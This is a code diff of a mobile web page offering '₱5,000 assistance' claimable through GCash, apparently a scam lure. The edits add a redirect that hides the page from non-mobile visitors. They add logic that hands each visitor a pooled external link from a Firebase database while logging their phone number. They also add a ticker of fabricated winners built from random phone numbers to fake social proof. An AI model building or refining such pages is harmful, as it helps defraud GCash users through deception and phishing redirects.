@@ -15,7 +15,6 @@
             --emerald: #40916c;
             --white-glass: rgba(255, 255, 255, 0.95);
             --text-dark: #1b4332;
-            --gcash-blue: #007dfe;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -24,22 +23,14 @@
             font-family: 'Public Sans', sans-serif; 
             background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            display: flex; justify-content: center; align-items: center; padding: 20px;
         }
 
         .card {
             background: var(--white-glass);
-            width: 100%;
-            max-width: 400px;
-            padding: 25px;
-            border-radius: 30px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            width: 100%; max-width: 400px; padding: 25px;
+            border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.1);
             text-align: center;
-            position: relative;
-            z-index: 1;
         }
 
         .logo-img { width: 180px; margin-bottom: 15px; border-radius: 12px; }
@@ -48,78 +39,27 @@
         .pay-button { 
             background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
             color: white; width: 100%; padding: 18px; border: none; border-radius: 15px; 
-            font-size: 16px; font-weight: 700; cursor: pointer;
+            font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s;
         }
+        .pay-button:disabled { background: #94a3b8; cursor: not-allowed; opacity: 0.7; }
 
         .promo-photo { width: 100%; border-radius: 15px; margin-top: 15px; }
 
-        /* WINNERS LIST AREA */
+        /* WINNERS AREA */
         .winners-container {
-            margin-top: 20px;
-            text-align: left;
-            background: #f8fdfb;
-            padding: 15px;
-            border-radius: 20px;
-            border: 1px solid #e0f2ea;
-            min-height: 250px; /* Space for 5 items */
+            margin-top: 20px; text-align: left; background: #f8fdfb;
+            padding: 15px; border-radius: 20px; border: 1px solid #e0f2ea;
         }
-
-        .winners-container h3 {
-            font-size: 12px;
-            color: #40916c;
-            text-transform: uppercase;
-            text-align: center;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
-
-        #winners-list {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        /* 3 SECONDS TRANSITION ANIMATION */
+        .winners-container h3 { font-size: 12px; color: #40916c; text-transform: uppercase; text-align: center; margin-bottom: 12px; }
         .winner-item {
-            background: white;
-            padding: 10px 15px;
-            border-radius: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
-            border: 1px solid #eee;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            background: white; padding: 10px; border-radius: 10px;
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 8px; border: 1px solid #eee;
+            animation: popIn 0.5s ease forwards;
         }
-
-        @keyframes popIn {
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .gcash-mini {
-            width: 20px;
-            height: 20px;
-            border-radius: 4px;
-            background: var(--gcash-blue);
-        }
-
-        .payout-green { color: #2d6a4f; font-weight: 800; font-size: 14px; }
-        .phone-num { font-size: 14px; font-weight: 600; color: #444; }
-
-        .live-footer {
-            margin-top: 12px;
-            font-size: 10px;
-            color: #666;
-            text-align: center;
-            font-weight: 700;
-        }
-        .dot { height: 6px; width: 6px; background: red; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.3; } }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .gcash-icon { width: 20px; height: 20px; }
+        .payout-green { color: #2d6a4f; font-weight: 800; }
     </style>
 </head>
 <body>
@@ -129,82 +69,101 @@
     <h1>Available Assistance</h1>
     <div class="amount" id="balanceText">₱5,000.00</div>
 
-    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">CLAIM THRU GCASH</button>
+    <button class="pay-button" id="claimBtn" onclick="processClaim()">CLAIM THRU GCASH</button>
 
     <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo">
 
     <div class="winners-container">
-        <h3><span class="dot"></span> Live Success Stories</h3>
-        <div id="winners-list">
-            </div>
-        <div class="live-footer">
-            <span id="beneficiary-count">20</span> Beneficiaries Today
-        </div>
+        <h3>🔴 Live Success Stories</h3>
+        <div id="winners-list"></div>
     </div>
 </div>
 
-<script src="config.js?v=4"></script>
+<script src="js/config.js"></script>
+
 <script>
-    // Security & Mobile Check
+    // 1. INITIALIZE FIREBASE
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 2. SECURITY CHECK
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     if (!isMobile || sessionStorage.getItem('verified_user') !== 'true') {
         window.location.href = "index.html"; 
     }
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    // 3. CLAIM LOGIC (REWORKED)
+    function processClaim() {
+        const btn = document.getElementById('claimBtn');
+        const userPhone = sessionStorage.getItem('user_phone') || "Unknown";
 
-    // Winners Generator
-    let totalBeneficiaries = 20;
-    const prefixes = ['0912', '0915', '0916', '0917', '0927', '0935', '0945', '0955', '0966', '0998'];
+        btn.disabled = true;
+        btn.innerText = "VERIFYING SLOT...";
 
-    function addNewWinner() {
+        // Humanap ng link na 'available' sa /links node
+        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value')
+        .then((snapshot) => {
+            if (snapshot.exists()) {
+                let linkId = '';
+                let linkData = null;
+                
+                snapshot.forEach(child => {
+                    linkId = child.key;
+                    linkData = child.val();
+                });
+
+                // I-update ang status para hindi makuha ng iba
+                db.ref('links/' + linkId).update({
+                    status: 'pending',
+                    claimedBy: userPhone,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                }).then(() => {
+                    btn.innerText = "REDIRECTING...";
+                    setTimeout(() => {
+                        window.location.href = linkData.url;
+                    }, 1000);
+                });
+
+            } else {
+                alert("All slots are currently busy. Please refresh or wait for a few minutes.");
+                btn.disabled = false;
+                btn.innerText = "CLAIM THRU GCASH";
+            }
+        })
+        .catch(err => {
+            console.error("Error:", err);
+            btn.disabled = false;
+            btn.innerText = "CLAIM THRU GCASH";
+        });
+    }
+
+    // 4. LIVE WINNERS LOGIC (3 Seconds Interval)
+    const prefixes = ['0912', '0915', '0916', '0917', '0927', '0935', '0945', '0955', '0966'];
+    
+    function showWinner() {
         const list = document.getElementById('winners-list');
-        const countDisplay = document.getElementById('beneficiary-count');
-        
-        // Random Data
         const pref = prefixes[Math.floor(Math.random() * prefixes.length)];
         const suffix = Math.floor(1000 + Math.random() * 8999);
-        totalBeneficiaries++;
-        countDisplay.innerText = totalBeneficiaries.toLocaleString();
 
-        // Create Element
         const item = document.createElement('div');
         item.className = 'winner-item';
         item.innerHTML = `
             <div style="display:flex; align-items:center; gap:10px;">
-                <img src="https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png" class="gcash-mini" onerror="this.style.background='#007dfe'">
-                <span class="phone-num">${pref}***${suffix}</span>
+                <img src="https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png" class="gcash-icon">
+                <span style="font-size:14px; font-weight:600;">${pref}***${suffix}</span>
             </div>
             <span class="payout-green">+₱5,000</span>
         `;
 
-        // Add to top
         list.prepend(item);
-
-        // Maintain only 5 items
-        if (list.children.length > 5) {
-            list.removeChild(list.lastChild);
-        }
+        if (list.children.length > 5) list.removeChild(list.lastChild);
     }
 
-    // Initialize 3 winners immediately, then loop every 3 seconds
     document.addEventListener("DOMContentLoaded", () => {
-        addNewWinner();
-        setTimeout(addNewWinner, 1000);
-        setTimeout(addNewWinner, 2000);
-        
-        // 3 SECONDS REFRESH RATE
-        setInterval(addNewWinner, 3000); 
+        showWinner();
+        showWinner();
+        setInterval(showWinner, 3000); 
     });
-
-    // Dummy Function for Redirect (Replace with your actual Firebase logic if needed)
-    function redirectToGCash() {
-        const btn = document.getElementById('claimBtn');
-        btn.disabled = true;
-        btn.innerText = "CHECKING SLOTS...";
-        // ... (Your existing Firebase Booking Logic here)
-    }
 </script>
 
 </body>
